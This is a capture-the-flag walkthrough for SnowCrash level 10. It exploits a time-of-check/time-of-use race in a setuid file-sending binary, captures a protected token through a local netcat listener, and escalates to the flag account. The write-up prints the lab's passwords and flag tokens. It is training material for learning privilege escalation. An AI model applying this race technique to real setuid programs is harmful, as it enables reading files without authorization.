# level10

Using `ls`, we can discover another couple of files.

```bash
level10@SnowCrash:~$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

Let's get some informations about our couple.

```bash
level10@SnowCrash:~$ readelf -p .rodata level10

String dump of section '.rodata':
  [     8]  %s file host^J^Isends file to host if you have access to it^J
  [    43]  Connecting to %s:6969 .. 
  [    5d]  Unable to connect to host %s^J
  [    7b]  .*( )*.^J
  [    84]  Unable to write banner to host %s^J
  [    a7]  Connected!^JSending file .. 
  [    c3]  Damn. Unable to open file
  [    dd]  Unable to read from file: %s^J
  [    fb]  wrote file!
  [   107]  You don't have access to %s^J

level10@SnowCrash:~$ nm -u level10
         w _Jv_RegisterClasses
         U __errno_location@@GLIBC_2.0
         w __gmon_start__
         U __libc_start_main@@GLIBC_2.0
         U __stack_chk_fail@@GLIBC_2.4
         U access@@GLIBC_2.0
         U connect@@GLIBC_2.0
         U exit@@GLIBC_2.0
         U fflush@@GLIBC_2.0
         U htons@@GLIBC_2.0
         U inet_addr@@GLIBC_2.0
         U open@@GLIBC_2.0
         U printf@@GLIBC_2.0
         U puts@@GLIBC_2.0
         U read@@GLIBC_2.0
         U socket@@GLIBC_2.0
         U strerror@@GLIBC_2.0
         U write@@GLIBC_2.0
level10@SnowCrash:~$ cat token
cat: token: Permission denied
level10@SnowCrash:~$ ./level10 token
./level10 file host
    sends file to host if you have access to it
level10@SnowCrash:~$ ./level10 token 127.0.0.1
You don't have access to token
```

Access comes after read, we will exploit [TOC/TOU](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use) flaw. This is actually a really interesting vulnerability in the 42 school ecosystem.

Let's upload our scripts to the server.

```bash
➜  level10 git:(main) ✗ scp -r -P 4242 ressources/ level10@localhost:/tmp/ressources
           _____                      _____               _     
          / ____|                    / ____|             | |    
         | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
          \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
          ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
         |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
                                                        
  Good luck & Have fun

          10.0.2.15 
level10@localhost's password: s5cAJpM8ev6XHw998pRWG728z
toctou.sh                                                                                                      100%  123    14.7KB/s   00:00    
caller.sh                                                                                                      100%   58   147.9KB/s   00:00
```

First, let's host a netcat server in **another** prompt, we will use the port 6969 as we saw in the readelf dump.

```bash
level10@SnowCrash:~$ nc -lk 6969
```

Run each ressources in dedicated prompts or using `&`.

Let is run a few seconds and use the following command to extract the flag.

```bash
level10@SnowCrash:~$ cat /tmp/out | grep -v ".*( )*."
woupa2yuojeeaaed06riuj63c
```

Let's get our flag.

```bash
level10@SnowCrash:~$ su flag10
Password: woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

And head to the level 11.

```bash
flag10@SnowCrash:~$ su level11
Password: feulo4b72j7edeahuete3no7c
level11@SnowCrash:~$ 
```
